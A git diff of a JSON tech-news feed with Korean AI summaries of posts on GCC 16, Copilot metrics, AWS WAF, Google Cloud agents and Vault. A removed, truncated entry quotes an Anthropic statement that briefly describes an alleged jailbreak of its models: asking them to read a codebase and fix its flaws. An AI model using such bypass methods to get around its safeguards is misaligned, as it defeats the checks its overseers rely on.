@@ -1,5 +1,212 @@
 [
   {
+    "id": "https://isocpp.org//blog/2026/06/new-features-in-gcc-16-improved-error-messages-and-sarif-output-david-malco",
+    "title": "New features in GCC 16: Improved error messages and SARIF output -- David Malcolm",
+    "summary": "GCC 16 is about to be released, so I'm sharing some of the new features I worked on this year. Some changes are visible to users, while others improve the system more subtly.\nNew features in GCC 16: I",
+    "aiSummary": "GCC 16 출시를 앞두고 사용자 경험과 시스템 효율성을 개선한 새로운 기능들이 공개되었습니다. \n\n가장 주목할 만한 변화는 향상된 오류 메시지 출력 방식입니다. 이번 업데이트에서는 복잡한 코드 구조를 계층화된 글머리 기호 형태로 보여주는 실험적인 옵션이 추가되었습니다. 사용자는 -fno-diagnostics-show-nesting 또는 -fdiagnostics-plain-output 옵션을 통해 가독성을 높일 수 있으며, 이를 통해 함수 선언과 정의 간의 불일치와 같은 실수를 더 명확하게 파악할 수 있게 되었습니다.\n\n또한, 이번 개선 사항은 계층적 구조 활용 범위를 넓히고 기존의 버그들을 수정하는 데 중점을 두었습니다. 개발자는 강화된 진단 기능을 통해 코드의 구조적 문제를 보다 직관적으로 확인하고 유지보수할 수 있는 환경을 제공받게 됩니다.",
+    "url": "https://isocpp.org//blog/2026/06/new-features-in-gcc-16-improved-error-messages-and-sarif-output-david-malco",
+    "category": "프로그래밍 언어",
+    "source": "ISO C++",
+    "author": "Blog Staff",
+    "pubDate": "Mon, 15 Jun 2026 22:22:24 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "C++"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-15-copilot-usage-metrics-now-include-more-of-your-active-users",
+    "title": "Copilot usage metrics now include more of your active users",
+    "summary": "Copilot usage metrics reports now draw on server-side telemetry in addition to client signals, so more of your active Copilot users show up in reports. Enterprise usage reports returned by…\nThe post C",
+    "aiSummary": "GitHub는 Copilot 사용량 측정 보고서의 정확도를 높이기 위해 기존의 클라이언트 측 신호 외에 서버 측 원격 측정 데이터를 새롭게 추가하였습니다.\n\n이번 업데이트를 통해 이전보다 더 많은 활성 사용자가 사용량 지표에 포함되어 더욱 정밀한 통계 확인이 가능해졌습니다. 이를 통해 Enterprise 관리자는 조직 내 Copilot의 활용 현황을 보다 포괄적으로 파악할 수 있게 됩니다.",
+    "url": "https://github.blog/changelog/2026-06-15-copilot-usage-metrics-now-include-more-of-your-active-users",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Mon, 15 Jun 2026 21:30:13 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://webkit.org/?p=18117",
+    "title": "The golden rule of Customizable Select",
+    "summary": "Customizable select is coming to Safari 27.",
+    "aiSummary": "Safari 27 버전부터 Customizable select 기능이 새롭게 도입될 예정입니다. 이 기능은 개발자가 웹 페이지의 select 요소를 더욱 유연하게 디자인하고 제어할 수 있도록 지원합니다. 그동안 브라우저 기본 스타일에 국한되었던 select 요소를 웹 표준 기술을 활용해 자유롭게 꾸밀 수 있게 됨에 따라 사용자 경험과 디자인의 일관성이 크게 향상될 것으로 기대됩니다.",
+    "url": "https://webkit.org/blog/18117/the-golden-rule-of-customizable-select/",
+    "category": "웹 생태계 & 브라우저",
+    "source": "WebKit Blog",
+    "author": "WebKit Blog",
+    "pubDate": "Mon, 15 Jun 2026 21:20:31 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "WebKit",
+      "Safari"
+    ]
+  },
+  {
+    "id": "b888b8d60a4fd57cdcb13b3f7ef4d08b578e7e5d",
+    "title": "AWS WAF adds AI traffic monetization capability to help content owners charge AI bots for content access",
+    "summary": "AWS WAF launches AI traffic monetization, a new Bot Control capability that enables content providers and publishers price, meter, and collect payment from AI bots and agents accessing their content a",
+    "aiSummary": "AWS WAF가 AI 봇과 에이전트의 콘텐츠 접근을 관리하고 수익화할 수 있는 새로운 기능을 공개하였습니다.\n\n이 기능을 통해 콘텐츠 제공자와 발행자는 자신의 데이터와 API를 사용하는 AI 봇에 가격을 책정하고 사용량을 측정하며 비용을 청구할 수 있게 됩니다.\n\nAWS WAF는 외부 결제 제공업체와의 연동을 지원하며, 엣지 단에서 직접 접근 권한을 세밀하게 제어하는 환경을 제공합니다. 이를 통해 웹 사이트나 서비스 운영자는 자신의 콘텐츠가 AI 학습이나 데이터 수집에 활용될 때 정당한 수익을 창출할 수 있는 기반을 마련하게 됩니다.",
+    "url": "https://aws.amazon.com/blogs/aws/aws-waf-adds-ai-traffic-monetization-capability-to-help-content-owners-charge-ai-bots-for-content-access/",
+    "category": "클라우드 & 인프라",
+    "source": "AWS News Blog",
+    "author": "Esra Kayabali",
+    "pubDate": "Mon, 15 Jun 2026 20:42:13 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "AWS",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/data-analytics/new-data-agents-across-the-agentic-data-cloud/",
+    "title": "What’s new in data agents: Supercharging your AI workflows",
+    "summary": "The rise of AI agents is fundamentally disrupting applications and analytical systems. Generic AI platforms don't usually have access to the context stored within enterprise databases. This is because",
+    "aiSummary": "Google은 기업 데이터 환경에서 AI 에이전트의 정확성과 보안을 보장하기 위해 자사의 통합 데이터 플랫폼인 Agentic Data Cloud를 기반으로 하는 다양한 신규 데이터 에이전트와 도구를 발표했습니다. 기존의 일반적인 AI 플랫폼이 가진 맥락 부족과 보안 취약점을 해결하기 위해 맞춤형 실리콘부터 Gemini 모델에 이르는 전체 스택에 AI를 통합하여 기업 데이터에 기반한 추론과 거버넌스를 제공합니다.\n\nConversational Analytics는 자연어를 사용하여 데이터에 접근할 수 있도록 기능을 확장했습니다. BigQuery Studio, Lakehouse, 그리고 AlloyDB, Spanner, Cloud SQL 등 주요 데이터베이스에 AI 추론 엔진을 통합하여 사용자가 SQL을 직접 작성하지 않고도 실시간 운영 및 분석 데이터를 질의할 수 있게 지원합니다. 특히 Looker Embedded Conversational Analytics를 통해 사용자 정의 애플리케이션에 대화형 AI를 손쉽게 임베드할 수 있습니다.\n\n데이터 전문가를 위한 새로운 데이터 에이전트들도 공개되었습니다. 데이터 파이프라인 구축을 자동화하는 Data Engineering Agent, 모델 개발을 가속화하는 Data Science Agent, 데이터베이스 성능을 모니터링하는 Database Observability Agent, 데이터베이스 선택 및 배포를 돕는 Database Onboarding Agent 등이 포함됩니다. 또한 Looker Dashboard Agent와 Gemini Enterprise를 통한 Conversational Analytics는 비즈니스 사용자가 기술적인 제약 없이 데이터 인사이트를 도출할 수 있도록 돕습니다.\n\n이외에도 Data Insights Agent와 Deep Research Agent는 구조화된 데이터와 비구조화된 데이터를 결합하여 복잡한 비즈니스 문제를 해결하고 심층적인 연구 보고서를 생성합니다.\n\n개발자 생태계를 지원하기 위한 도구도 강화되었습니다. 개발 환경 내에서 데이터 활용을 돕는 Data Agent Kit를 비롯하여 AlloyDB, Spanner 등 주요 데이터베이스에 대한 Managed MCP Servers를 통해 AI 모델과 데이터 간의 연결을 더욱 안전하고 효율적으로 관리할 수 있습니다. 또한 MCP Toolbox 1.0의 정식 출시와 QueryData 기능을 통해 자연어 기반의 쿼리 변환 정확도를 높였으며, UCP Analytics를 통해 에이전트 기반 상거래에 대한 실시간 관측 가능성도 제공합니다.",
+    "url": "https://cloud.google.com/blog/products/data-analytics/new-data-agents-across-the-agentic-data-cloud/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Sean Rhee"
+      ],
+      "title": [
+        "Product Management, Google Cloud"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Mon, 15 Jun 2026 17:00:00 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://medium.com/p/475913d622ec",
+    "title": "Flutter Q2 survey",
+    "summary": "Flutter is Google's UI framework for crafting high-quality native interfaces on iOS, Android, web, and desktop. Flutter works with existing code, is used by developers and organizations around the wor",
+    "aiSummary": "Google은 현재 Flutter 개발자들을 대상으로 분기별 만족도와 의견을 수렴하기 위한 2분기 설문조사를 진행하고 있습니다.\n\n이번 설문조사는 향후 Flutter의 로드맵 방향을 결정하고 제품 개선에 필요한 중요한 데이터를 확보하는 목적으로 실시됩니다.\n\n설문 참여는 6월 19일 금요일 일과 종료 시점까지 가능하며 개발자의 피드백은 공식 홈페이지를 통해 수집됩니다.",
+    "url": "https://blog.flutter.dev/flutter-q2-survey-475913d622ec?source=rss----4da7dfd21a33---4",
+    "category": "프로그래밍 언어",
+    "source": "Flutter Blog",
+    "author": "Shams Zakhour",
+    "pubDate": "Mon, 15 Jun 2026 16:42:40 GMT",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "Flutter",
+      "Dart"
+    ]
+  },
+  {
+    "id": "https://www.docker.com/?p=91127",
+    "title": "Docker joins the Athena coalition: a cross-industry collaboration for supply chain security",
+    "summary": "The obvious takeaway from 2026's biggest incidents is that attackers are increasingly using AI to move fast. Docker's CISO, Mark Lechner, wrote about this shift and what every engineering team should ",
+    "aiSummary": "Docker가 공급망 보안 강화를 위해 산업 간 협력체인 Athena coalition에 합류했습니다. 최근 2026년의 주요 보안 사고들은 공격자들이 AI를 활용하여 공격 속도를 가속화하고 있음을 시사하고 있습니다.\n\nDocker의 CISO인 Mark Lechner는 이러한 보안 환경의 변화를 지적하며 모든 엔지니어링 팀이 즉각적인 대응 체계를 갖춰야 한다고 강조했습니다. 특히 기술 발전으로 인해 보안 취약점을 발견하고 악용하는 진입 장벽이 낮아지고 있다는 점이 업계의 큰 우려 사항으로 떠오르고 있습니다.\n\n이번 Athena coalition 참여를 통해 Docker는 공급망 전반에 걸친 보안 표준을 수립하고, 고도화되는 AI 기반의 위협에 공동으로 대응하는 전략을 추진할 예정입니다.",
+    "url": "https://www.docker.com/blog/docker-joins-the-athena-coalition-a-cross-industry-collaboration-for-supply-chain-security/",
+    "category": "클라우드 & 인프라",
+    "source": "Docker Blog",
+    "author": "Aditya Tripathi",
+    "pubDate": "Mon, 15 Jun 2026 16:24:29 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "Docker",
+      "Infra"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-the-4-lessons-that-guided-ai-threat-defense/",
+    "title": "Cloud CISO Perspectives: The 4 lessons that guided AI Threat Defense",
+    "summary": "Welcome to the first Cloud CISO Perspectives for June 2026. Today, we introduce Chris Betz as the new CISO of Google Cloud. For his first Cloud CISO Perspectives, Chris shares four key lessons we lear",
+    "aiSummary": "Google Cloud의 새로운 CISO인 Chris Betz는 AI 기술이 사이버 보안 환경을 급격히 변화시키고 있다고 평가하며, 이에 대응하기 위한 핵심 전략인 AI Threat Defense의 네 가지 운영 원칙을 제시합니다.\n\n첫 번째는 준비 단계로, 기업의 공격 표면을 최소화하고 보안 운영을 위한 프레임워크를 구축해야 합니다. 여기에는 보안 팀과 엔지니어링 팀 간의 긴밀한 협업, 하드웨어 및 토큰 예산의 효율적 배분, 그리고 변화 관리를 위한 체계적인 계획 수립이 포함됩니다.\n\n두 번째는 스캔 및 우선순위 지정 단계입니다. 기술 전문가와 적절한 도구, 그리고 다수의 AI 모델을 결합하여 취약점을 분석하는 것이 중요합니다. 특히 영향력이 큰 핵심 코드부터 우선적으로 점검하고, AI를 활용해 오탐률을 낮추며 취약점의 중요도를 정확히 파악해야 합니다.\n\n세 번째는 교정 단계입니다. 가시성이 확보된 중앙 집중식 시스템을 통해 취약점 해결 과정을 추적하고, 외부 노출도가 높고 영향력이 큰 영역부터 우선적으로 패치를 적용합니다. 또한 취약점 해결을 넘어 시스템 자체를 강화하는 복원력 중심의 접근 방식을 채택하며, 보안 취약점을 제거하기 위해 오픈소스 소프트웨어 관리 전략인 갱신, 제거, 재작성 방식을 병행합니다.\n\n마지막 네 번째는 모니터링 단계입니다. 지속적인 피드백 루프를 통해 시스템 과부하나 새로운 취약점 발생 지점을 상시 감시해야 합니다. AI 에이전트를 활용하여 보안 표준을 자동화하고, 위협 탐지 및 대응 과정을 최적화함으로써 시간이 지날수록 더욱 견고해지는 보안 체계를 구축하는 것이 핵심입니다.",
+    "url": "https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-the-4-lessons-that-guided-ai-threat-defense/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Chris Betz"
+      ],
+      "title": [
+        "CISO, Google Cloud"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Mon, 15 Jun 2026 16:00:00 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/databases/graph-technologies-underpin-yahoo-system-of-action/",
+    "title": "Architecting a trusted agentic platform with graph technologies: A Yahoo case study",
+    "summary": "As enterprises adopt agentic AI, they need to shift from reactive systems of intelligence to proactive systems of action to equip the agents they’re building with the context and performance they need",
+    "aiSummary": "Yahoo는 Google Cloud와 협력하여 복잡한 디지털 미디어 구매 과정을 자동화하는 Seller Agent 플랫폼을 구축했습니다. 이 플랫폼은 수주가 소요되던 업무를 수 초 내로 단축하면서도, AI 에이전트의 결정에 대한 투명성과 책임성을 확보한 것이 핵심입니다.\n\n플랫폼은 지식 그래프와 맥락 그래프라는 이중 그래프 구조를 통해 신뢰할 수 있는 실행 환경을 구현합니다. Spanner Graph 기반의 지식 그래프는 광고 인벤토리, 계약 조건, 규제 정책 등을 실시간으로 반영하여 에이전트가 비즈니스 논리에 근거해 판단하도록 지원합니다. 또한 BigQuery Graph를 사용하는 맥락 그래프는 에이전트의 모든 결정 과정과 정책 적용 근거를 기록하여, 추후 감사나 설명 가능성이 요구될 때 즉각적으로 추적 가능한 데이터 환경을 제공합니다.\n\n이러한 아키텍처는 단순히 생성형 AI 모델을 도입하는 것을 넘어, 확률적 모델의 한계를 확정적 비즈니스 규칙과 결합한 시스템입니다. Yahoo의 사례는 금융 거래나 공급망 관리와 같이 고도의 정확성과 규제 준수가 필요한 산업 분야에서, 기업이 자율 에이전트를 안전하게 운영하기 위한 표준 청사진을 제시합니다.\n\n결론적으로 기업의 경쟁력은 범용적인 언어 모델 자체보다, 자사의 고유한 비즈니스 운영 정보와 과거 결정 기록을 구조화한 그래프 데이터에 의해 결정됩니다. 기업은 에이전트가 단순히 작업을 수행하는 것을 넘어, 자신의 행동을 설명하고 규제 수준의 거버넌스를 준수하도록 설계된 시스템을 구축해야 합니다.",
+    "url": "https://cloud.google.com/blog/products/databases/graph-technologies-underpin-yahoo-system-of-action/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Mikul Bhatt"
+      ],
+      "title": [
+        "Director Of Engineering, Yahoo"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Mon, 15 Jun 2026 16:00:00 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://www.hashicorp.com/blog/implementing-workload-identity-with-hashicorp-vault-and-spiffe",
+    "title": "Implementing workload identity with HashiCorp Vault and SPIFFE",
+    "summary": "Modern workloads are making machine identity strategy harder, not easier. Teams want a standard way to name and verify workloads, but they also need a realistic path from identity to access control. T",
+    "aiSummary": "현대 클라우드 환경에서 워크로드를 식별하고 권한을 제어하는 것은 복잡한 과제가 되었습니다. 많은 조직이 SPIFFE 표준을 통해 워크로드 식별을 표준화하려 하지만, 식별 그 자체만으로는 실제 서비스의 권한 부여 문제까지 해결해주지는 않습니다. 이러한 맥락에서 HashiCorp Vault는 SPIFFE와 상호보완적인 역할을 수행하며, 신뢰할 수 있는 워크로드 식별자를 기반으로 동적 비밀, 인증서, 접근 권한을 관리하는 제어 평면으로서 핵심적인 기능을 제공합니다.\n\nSPIFFE는 플랫폼에 구애받지 않는 이식 가능한 기계 식별 표준을 정의하며, SPIFFE ID와 SVID를 통해 워크로드를 유일하게 식별합니다. 반면, SPIRE는 노드 및 워크로드에 대한 엄격한 검증과 SVID 발급을 수행하는 런타임 구현체입니다. 하지만 모든 조직이 초기부터 SPIRE의 복잡한 운영 오버헤드를 감당할 준비가 된 것은 아니며, 대다수는 식별된 워크로드가 데이터베이스나 API에 어떻게 접근할지 결정하는 권한 부여 체계가 더욱 시급합니다.\n\nVault는 SPIFFE와 결합하여 다음과 같은 실무적인 아키텍처 패턴을 지원합니다.\n\n첫째, Vault의 SPIFFE 인증 방식과 PKI 엔진을 활용하여 워크로드 간의 제로 트러스트 mTLS를 구현할 수 있습니다. Vault는 쿠버네티스 서비스 계정 등을 기반으로 인증한 뒤 SPIFFE 식별자가 포함된 X.509 인증서를 발행하며, 이후 통신 과정에는 개입하지 않아 성능과 확장성을 보장합니다.\n\n둘째, JWT-SVID를 이용한 네트워크 간 API 인증을 지원합니다. Vault는 표준 JWT를 발행하여 외부 서비스가 복잡한 인증 절차 없이도 워크로드의 식별자와 비즈니스 컨텍스트를 검증하게 합니다. 이는 클라우드 간의 자격 증명 교환에도 활용되어 고정된 키를 제거하는 데 기여합니다.\n\n셋째, 기존 SPIRE 환경과의 통합입니다. Vault는 SPIRE가 발행한 SVID를 인증하여 데이터베이스 자격 증명을 제공하는 브로커 역할을 수행하거나, 반대로 Vault의 PKI 엔진을 SPIRE의 상위 인증 기관으로 설정하여 조직의 신뢰 체인을 통합 관리할 수 있게 합니다.\n\n결론적으로 워크로드 식별 전략은 식별자 모델인 SPIFFE, 권한 부여와 자격 증명 브로커 역할을 하는 Vault, 그리고 필요에 따라 심층적인 런타임 검증을 제공하는 SPIRE를 적절히 조합하는 것이 중요합니다. 이들의 역할 분담을 통해 조직은 파편화된 권한 관리 체계를 일관된 표준으로 통합하고, 운영 환경 전반에 걸쳐 안전하고 유연한 접근 제어를 달성할 수 있습니다.",
+    "url": "https://www.hashicorp.com/blog/implementing-workload-identity-with-hashicorp-vault-and-spiffe",
+    "category": "클라우드 & 인프라",
+    "source": "Terraform Blog",
+    "author": "Dinesh Gawande",
+    "pubDate": "2026-06-15T16:00:00.000Z",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "Terraform",
+      "IaC"
+    ]
+  },
+  {
     "id": "https://bun.sh/blog/bun-v1.3.10",
     "title": "Bun v1.3.10",
     "summary": "To install Buncurlcurl -fsSL https://bun.sh/install | bashnpmnpm install -g bunpowershellpowershell -c \"irm bun.sh/install.ps1|iex\"scoopscoop install bunbrewbrew tap oven-sh/bunbrew install bundockerd",
@@ -157,6 +364,38 @@
     "tags": [
       "FastAPI",
       "Python"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/topics/developers-practitioners/how-i-learned-go-in-a-day-with-antigravity-20-and-how-you-can-do-the-same/",
+    "title": "How I learned Go in a Day with Antigravity 2.0 and How You Can Do the Same",
+    "summary": "I have been exploring how to reclaim my software stack from NPM dependency overhead and replace my resource-intensive Node.js runtime with a compiled, single-binary Go CLI. The result of my efforts is",
+    "aiSummary": "사용자는 기존 Node.js 기반의 무거운 의존성을 가진 CLI 도구를 성능이 뛰어나고 메모리 효율적인 Go 언어 기반의 단일 바이너리로 재구축하는 과정을 공유합니다. 이번 마이그레이션 프로젝트는 Antigravity 2.0이라는 AI 도구를 활용하여 진행되었으며, 단순히 코드를 변환하는 것을 넘어 학습과 설계 중심의 개발 철학을 적용했습니다.\n\n프로젝트의 첫 단계는 목표 설정과 기술 스택 검토였습니다. 작성자는 제로 의존성, 높은 성능, 무신뢰 보안 모델을 목표로 삼았으며, Rust와 Python, Zig 등을 검토한 끝에 선형적인 코드 구조와 풍부한 표준 라이브러리를 갖춘 Go를 최적의 언어로 선택했습니다. 이후 Antigravity에 Go 관련 Agent Skill을 학습시켜 개발 환경의 기준을 맞추고, 기존 TypeScript 기반의 로직을 Go 언어로 체계적으로 변환했습니다.\n\n개발 과정에서는 테스트 주도 개발(TDD)을 핵심 원칙으로 삼았습니다. Agent가 table-driven test 패턴으로 테스트 코드를 먼저 작성하게 하여 ReDoS와 같은 보안 취약점을 방지하고, 에러 처리 명령을 준수하도록 설계했습니다. 또한 코드의 신뢰성을 확보하기 위해 개별 명령어 단위로 subagent를 활용하는 병렬화 전략을 사용했으며, 이를 통해 전체 구조를 유지하면서도 개별 기능의 완성도를 높였습니다.\n\n마지막으로 CI/CD 파이프라인 구축과 Agent Skill화를 통해 개발 경험을 자산화했습니다. 작성자는 이번 과정에서 통합 개발 환경(IDE)에 의존하는 대신 AI를 지휘하는 건축가로서 프로젝트를 주도하며 Go 언어를 빠르게 습득했습니다. 결론적으로, 이번 경험은 기술적 전환뿐만 아니라 AI 에이전트를 효과적으로 관리하고 아키텍처를 설계하는 엔지니어링 역량을 성장시키는 계기가 되었습니다.",
+    "url": "https://cloud.google.com/blog/topics/developers-practitioners/how-i-learned-go-in-a-day-with-antigravity-20-and-how-you-can-do-the-same/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Alex \"Sandu\" Astrum"
+      ],
+      "title": [
+        "Developer Relations, Antigravity"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Mon, 15 Jun 2026 09:29:00 +0000",
+    "fetchedAt": "2026-06-16T02:03:24.292Z",
+    "tags": [
+      "GCP",
+      "Cloud"
     ]
   },
   {
@@ -706,226 +945,6 @@
     "tags": [
       "Terraform",
       "IaC"
-    ]
-  },
-  {
-    "id": "https://cloud.google.com/blog/products/business-intelligence/dashboard-agents-in-looker/",
-    "title": "Transform dashboards into interactive data experiences with Looker agents",
-    "summary": "Dashboards have long served as a primary way for organizations to extract insights from data, but they can fall short in agile environments: Dashboards aren’t interactive and don’t allow you to ask fo",
-    "aiSummary": "Google Cloud는 기존의 정적인 대시보드가 가진 한계를 극복하기 위해 Looker dashboard agents를 프리뷰 버전으로 공개합니다. 사용자는 Gemini 아이콘을 클릭하여 자연어로 질문을 던질 수 있으며, 대시보드 내에 내장된 지능형 에이전트가 문맥을 파악해 실시간으로 답변과 시각화 자료를 제공합니다.\n\nLooker dashboard agents는 대시보드에 적용된 필터와 교차 필터, 기존 타일 정보를 직접 참조하여 복잡한 비즈니스 질문에 대해 정확한 분석 결과를 도출합니다. 데이터 분석가는 시맨틱 레이어 상단에 자연어 지침을 추가하여 에이전트가 기업 고유의 비즈니스 로직을 올바르게 해석하도록 세밀하게 구성할 수 있습니다. 이를 통해 분석가 팀의 업무 부담을 줄이고 사용자가 직접 데이터를 탐색하는 셀프 서비스 분석 환경을 지원합니다.\n\n시스템에 대한 신뢰성을 확보하기 위해 에이전트는 답변 도출 과정에서의 추론 단계와 참조한 데이터 소스, 적용된 필터 등을 투명하게 공개합니다. 또한 Looker의 기존 거버넌스 모델 및 권한 관리 체계를 그대로 계승하여 허가된 사용자만 데이터에 접근할 수 있도록 설계되었습니다.\n\nLooker 26.08.11 버전 이상부터 관리자 설정에서 Gemini in Looker 기능을 활성화하여 사용할 수 있으며, 향후 iframe 임베딩 지원 등을 통해 외부 포털이나 애플리케이션으로 확장될 예정입니다.",
-    "cleanContent": "Dashboards have long served as a primary way for organizations to extract insights from data, but they can fall short in agile environments: Dashboards aren’t interactive and don’t allow you to ask follow-up questions. This forces users to step outside their workflows or turn to data analysts to get the answers they need. Today, we are introducing Looker dashboard agents in preview, embedding intelligent, conversational data agents directly within dashboards and empowering users to explore their business intelligence (BI) data using natural language.\n\n\n\n\n\n\n\n\n  \n    \nStart a conversation with a Looker dashboard agent\n\n      \n    \n\n  \n      \nInteractive agent-led investigations\nTraditionally, dashboards have presented a static view of data. With dashboard agents in Looker, users can explore their data directly within the dashboard interface. Users can start a conversation by clicking the Gemini icon and asking natural-language questions to receive contextual insights.\nThe accuracy of a data agent depends on the business context it is provided, and its ability to map appropriate metrics and dimensions to users’ inquiries. The Looker dashboard agent has direct context about the user’s applied filters, cross-filters, and pre-curated tiles, helping it to generate highly relevant and accurate answers to complex business questions.\nShould a query require more data, the agent can access underlying Explores to uncover additional information. These insights are paired with relevant charts and natural language explanations to simplify data exploration.\n\n\n\n\n\n\n\n\n  \n    \nExplore data beyond dashboard to uncover deeper insights\n\n      \n    \n\n  \n      \nTailor the agent to your business \nData analysts curate dashboards to provide business users with precise perspectives on organizational data. To maintain this kind of consistent and reliable analytical environment, the Looker dashboard agent is highly configurable. Analysts can add context on top of the Looker semantic layer by providing natural-language instructions directly to the agent. This way, they can define exactly how the agent interprets unique business logic and tailors responses for the target audience. By enabling self-serve data analysis, dashboard agents help analyst teams scale to meet the increasing data demands of the business.\n\n\n\n\n\n\n\n\n  \n    \nConfigure Looker dashboard agents\n\n      \n    \n\n  \n      \nInherited trust and transparency \nFor users to adopt an AI-based system, they must trust the information it provides them. When generating an insight, the Looker dashboard agent explicitly shows its work by displaying intermediate reasoning, referenced dashboard tiles, and applied filters. Additionally, the administrator needs to trust users only have access to data and insights to which they are authorized. The dashboard agent is backed by Looker’s governance model, managed through standard permissions.\nWe are actively working on additional capabilities for the Looker dashboard agent, including support for iframe embedding, allowing organizations to bring dashboard agents alongside Looker dashboards into any essential portal or application.\nEnable dashboard agents today\nWith Looker version 26.08.11 and later, administrators can activate the dashboard agent capability by toggling \"Enable Chat with Dashboard\" within the Gemini in Looker settings. Once enabled, authorized users will see the Gemini icon and can begin chatting with their dashboard data immediately. Please explore our support documentation for more detailed information.",
-    "url": "https://cloud.google.com/blog/products/business-intelligence/dashboard-agents-in-looker/",
-    "category": "클라우드 & 인프라",
-    "source": "Google Cloud Blog",
-    "author": {
-      "$": {
-        "xmlns:author": "http://www.w3.org/2005/Atom"
-      },
-      "name": [
-        "Vaibhavi Sonavane"
-      ],
-      "title": [
-        "Product Manager"
-      ],
-      "department": [
-        ""
-      ],
-      "company": [
-        ""
-      ]
-    },
-    "pubDate": "Thu, 11 Jun 2026 16:00:00 +0000",
-    "fetchedAt": "2026-06-14T10:33:56.852Z",
-    "tags": [
-      "GCP",
-      "Cloud"
-    ]
-  },
-  {
-    "id": "https://www.anthropic.com/news/fable-mythos-access",
-    "title": "Statement on the US government directive to suspend access to Fable 5 and Mythos 5",
-    "summary": "ResearchPolicyCommitmentsLearnNewsTry ClaudeAnnouncementsStatement on the US government directive to suspend access to Fable 5 and Mythos 5Jun 12, 2026The US government, citing national security autho",
-    "aiSummary": "미국 정부는 국가 안보를 이유로 Anthropic의 AI 모델인 Fable 5와 Mythos 5에 대한 모든 외국인의 접근을 즉각 중단하라는 수출 통제 지침을 발표했습니다. 이에 따라 Anthropic은 해당 모델에 대한 고객의 접근을 즉시 차단했습니다.\n\nAnthropic 측은 정부가 지목한 보안 우려 사항이 특정 코드베이스의 소프트웨어 결함을 수정하도록 하는 수준의 단순한 잠재적 우회 기술에 불과하며, 이는 OpenAI의 GPT-5.5를 비롯한 다른 공개 모델에서도 이미 가능한 보편적인 기능이라고 반박했습니다.\n\nAnthropic은 이번 정부 조치가 기술적 사실에 근거하지 않았으며, 동일한 기준을 적용할 경우 업계 전반의 모든 차세대 모델 배포가 중단될 것이라고 지적했습니다. 해당 기업은 이번 지침이 오해에서 비롯되었다고 판단하여 조속한 서비스 복구를 위해 노력하고 있으며, 향후 24시간 내에 상세 내용을 추가로 공유할 예정입니다.",
-    "cleanContent": "ResearchPolicyCommitmentsLearnNewsTry ClaudeAnnouncementsStatement on the US government directive to suspend access to Fable 5 and Mythos 5Jun 12, 2026The US government, citing national security authorities, has issued an export control directive to suspend all access to Fable 5 and Mythos 5 by any foreign national, whether inside or outside the United States, including foreign national Anthropic employees. The net effect of this order is that we must abruptly disable Fable 5 and Mythos 5 for all our customers to ensure compliance. Access to all other Anthropic models will not be affected. We received the directive from the government today at 5:21pm (ET). The letter did not provide specific details of its national security concern. Our understanding is that the government believes it has become aware of a method of bypassing, or “jailbreaking” Fable 5. We reviewed a demonstration of this specific technique being used to identify a small number of previously known, minor vulnerabilities. These vulnerabilities all appear relatively simple, and we have found that other publicly-available models are able to discover them as well without requiring a bypass. Anthropic’s posture with respect to Fable’s safeguards, as laid out in our launch blog post, is the following: To date, the government has only given us verbal evidence of a potential narrow, non-universal jailbreak, which essentially consists of asking the model to read a specific codebase and fix any software flaws. Our understanding is that one potential jailbreak was shared with the government. We have reviewed a report that we believe is the basis of the government&#x27;s directive and validated that the level of capability displayed there is widely available from other models (including OpenAI’s GPT-5.5), and is used every day by the defenders who keep systems safe. We will share more details over the next 24 hours. We are complying with the government’s legal directive and are removing access to Fable 5 and Mythos 5 for all users. However, we disagree that the finding of a narrow potential jailbreak should be cause for recalling a commercial model deployed to hundreds of millions of people. If this standard was applied across the industry, we believe it would essentially halt all new model deployments for all frontier model providers. As we have stated publicly, we believe the government should have the ability to block unsafe deployments, as part of a statutory process that is transparent, fair, clear, and grounded in technical facts. This action does not adhere to those principles. We apologize for this disruption to our customers. We believe this is a misunderstanding and are working to restore 